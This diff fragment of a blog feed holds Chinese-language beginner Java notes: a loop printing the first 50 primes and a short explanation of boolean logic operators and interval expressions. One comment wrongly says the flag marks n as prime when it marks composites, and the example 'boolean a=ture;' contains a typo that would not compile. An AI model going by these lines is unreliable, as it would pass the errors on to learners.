+<pre><code>int cout=0;              //计数标志
+for(int n=2;cout&lt;50;n++){//[0~50)个计数循环共50个
+    int flag=0;
+    for(int i=2;i*i&lt;=n;i++){
+        if(n%i==0){
+            flag=1;      //当判断n为质数，标记
+            break;       //跳出当前循环判断下一个n
+        }
+    }
+    if(flag==1){         //根据判断n是否被标记来输出
+    }
+    else{
+        cout=cout+1;
+        System.out.println(&quot;第&quot;+cout+&quot;素数是：&quot;+n);
+    }
+}
+</code></pre>
+<p>🏳️‍🌈boolean类型</p>
+<!-- more -->
+<p>例：boolean a=ture;//布尔类型定义<br>
+布尔类型逻辑运算：<br>
+①  !a      (逻辑非)<br>
+②a&amp;&amp;b(逻辑与)<br>
+③a||b    (逻辑或)<br>
+逻辑运算优先级：!&gt;&amp;&amp;&gt;||<br>
+例：表达数学中的区间x∈(4,6)，x∈[4,6]<br>
+答：①x&gt;4&amp;&amp;x&lt;6           ②x&gt;=4&amp;&amp;x&lt;=6<br>
+<img src="https://xiahexingkong.github.io/post-images/1643277079277.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+</feed>
